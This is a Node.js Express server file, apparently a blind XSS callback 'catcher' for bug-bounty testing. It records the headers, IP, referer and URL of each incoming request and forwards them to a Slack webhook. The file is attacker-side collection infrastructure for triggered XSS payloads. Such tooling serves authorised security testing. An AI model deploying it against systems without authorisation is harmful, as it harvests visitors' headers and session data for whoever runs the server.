const express = require('express');
const app = express();
const axios = require('axios');
require('dotenv').config();

const SLACK_WEBHOOK_URL = process.env.SLACK_WEBHOOK_URL;

app.get('/api/catcher', async (req, res) => {
    const timestamp = new Date().toISOString();
    const url = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
    const method = req.method;
    const referer = req.headers['referer'] || 'N/A';

    const bugBountyProgram = req.query.bug_bounty_program || 'N/A';

    const capturedData = {
        timestamp,
        url,
        method,
        headers: req.headers,
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        referer,
        query: {
            bug_bounty_program: bugBountyProgram
        },
    };

    console.log("Blind XSS payload captured: ", capturedData);

    const slackMessage = {
        text: `🚨 *Blind XSS Payload Captured!* 🚨\n\n*Details:*\n\`\`\`${JSON.stringify(capturedData, null, 2)}\`\`\``,
    };

    try {
        await axios.post(SLACK_WEBHOOK_URL, slackMessage);
        console.log('Slack alert sent successfully');
    } catch (error) {
        console.error('Failed to send Slack Alert:', error.message);
    }

    res.status(200).json('Payload received successfully');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));